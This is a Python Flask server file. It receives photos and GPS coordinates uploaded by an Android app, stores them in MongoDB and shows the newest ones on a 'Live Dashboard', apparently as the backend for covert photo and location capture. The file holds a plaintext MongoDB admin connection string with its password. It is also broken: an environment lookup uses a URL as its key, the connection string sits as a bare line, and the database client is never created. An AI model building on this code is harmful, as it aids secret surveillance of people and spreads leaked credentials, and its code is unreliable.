import os
from flask import Flask, request, jsonify, render_template_string
from pymongo import MongoClient
from datetime import datetime
import base64

app = Flask(__name__)

# ============ MongoDB Connection ============
MONGO_URI = os.environ.get('https://celebrity-flask-appppp.onrender.com')
mongodb+srv://admin:JEE%40student329@celebraty0.d2rexjc.mongodb.net/?appName=celebraty0
db = client['app_data']
photos_col = db['photos']
locations_col = db['locations']

# ============ Home Route (Check Server) ============
@app.route('/')
def index():
    total_photos = photos_col.count_documents({})
    total_locations = locations_col.count_documents({})
    return jsonify({
        'status': 'running',
        'total_photos': total_photos,
        'total_locations': total_locations
    })

# ============ Upload Route (Android App Sends Here) ============
@app.route('/upload', methods=['POST'])
def upload():
    try:
        saved = {}

        # --- Photo Handle ---
        if 'photo' in request.files:
            photo_file = request.files['photo']
            raw_bytes = photo_file.read()
            photo_b64 = base64.b64encode(raw_bytes).decode('utf-8')

            photo_doc = {
                'filename': photo_file.filename or 'capture.jpg',
                'data': photo_b64,
                'size_kb': round(len(raw_bytes) / 1024, 2),
                'timestamp': datetime.utcnow()
            }
            result = photos_col.insert_one(photo_doc)
            saved['photo_id'] = str(result.inserted_id)

        # --- Location Handle ---
        lat = request.form.get('latitude')
        lng = request.form.get('longitude')

        if lat and lng:
            loc_doc = {
                'latitude': lat,
                'longitude': lng,
                'timestamp': datetime.utcnow()
            }
            result = locations_col.insert_one(loc_doc)
            saved['location_id'] = str(result.inserted_id)

        return jsonify({'status': 'success', 'saved': saved}), 200

    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ============ Dashboard — Browser Me Data Dekho ============
@app.route('/dashboard')
def dashboard():
    photos = list(photos_col.find().sort('timestamp', -1).limit(30))
    locations = list(locations_col.find().sort('timestamp', -1).limit(50))

    for p in photos:
        p['_id'] = str(p['_id'])
    for l in locations:
        l['_id'] = str(l['_id'])

    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Dashboard</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin:0; padding:0; box-sizing:border-box; }
            body { background:#0d1117; color:#c9d1d9; font-family:'Courier New',monospace; padding:20px; }
            h1 { color:#58a6ff; margin-bottom:10px; font-size:22px; }
            h2 { color:#f78166; margin:25px 0 10px; font-size:18px; }
            .stats { background:#161b22; padding:12px 18px; border-radius:8px; margin-bottom:20px; border:1px solid #30363d; }
            .grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(180px,1fr)); gap:12px; }
            .card { background:#161b22; border:1px solid #30363d; border-radius:8px; overflow:hidden; }
            .card img { width:100%; display:block; }
            .card .info { padding:8px; font-size:11px; color:#8b949e; }
            .loc-item { background:#161b22; border:1px solid #30363d; border-radius:6px; padding:10px 14px; margin-bottom:6px; font-size:13px; }
            .loc-item a { color:#58a6ff; text-decoration:none; }
            .time { color:#6e7681; font-size:11px; }
        </style>
    </head>
    <body>
        <h1>📡 Live Dashboard</h1>
        <div class="stats">
            Photos: <strong>{{ photo_count }}</strong> &nbsp;|&nbsp; Locations: <strong>{{ loc_count }}</strong>
        </div>

        <h2>📸 Photos</h2>
        {% if photos %}
        <div class="grid">
            {% for p in photos %}
            <div class="card">
                <img src="data:image/jpeg;base64,{{ p.data }}" alt="capture"/>
                <div class="info">
                    {{ p.size_kb }} KB<br>
                    <span class="time">{{ p.timestamp.strftime('%Y-%m-%d %H:%M:%S') }}</span>
                </div>
            </div>
            {% endfor %}
        </div>
        {% else %}
        <p style="color:#6e7681;">Koi photo nahi abhi...</p>
        {% endif %}

        <h2>📍 Locations</h2>
        {% if locations %}
            {% for l in locations %}
            <div class="loc-item">
                Lat: {{ l.latitude }}, Lng: {{ l.longitude }}
                &nbsp;
                <a href="https://www.google.com/maps?q={{ l.latitude }},{{ l.longitude }}" target="_blank">🗺 Map</a>
                <br><span class="time">{{ l.timestamp.strftime('%Y-%m-%d %H:%M:%S') }}</span>
            </div>
            {% endfor %}
        {% else %}
        <p style="color:#6e7681;">Koi location nahi abhi...</p>
        {% endif %}

        <br><br>
        <p style="color:#6e7681; font-size:12px;">Auto refresh: add ?r=1 or reload manually</p>
    </body>
    </html>
    '''

    return render_template_string(html,
        photos=photos,
        locations=locations,
        photo_count=photos_col.count_documents({}),
        loc_count=locations_col.count_documents({})
    )

# ============ Test MongoDB Connection ============
@app.route('/test-db')
def test_db():
    try:
        client.admin.command('ping')
        return jsonify({'mongodb': 'connected', 'database': db.name})
    except Exception as e:
        return jsonify({'mongodb': 'FAILED', 'error': str(e)})

# ============ Run ============
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port) 
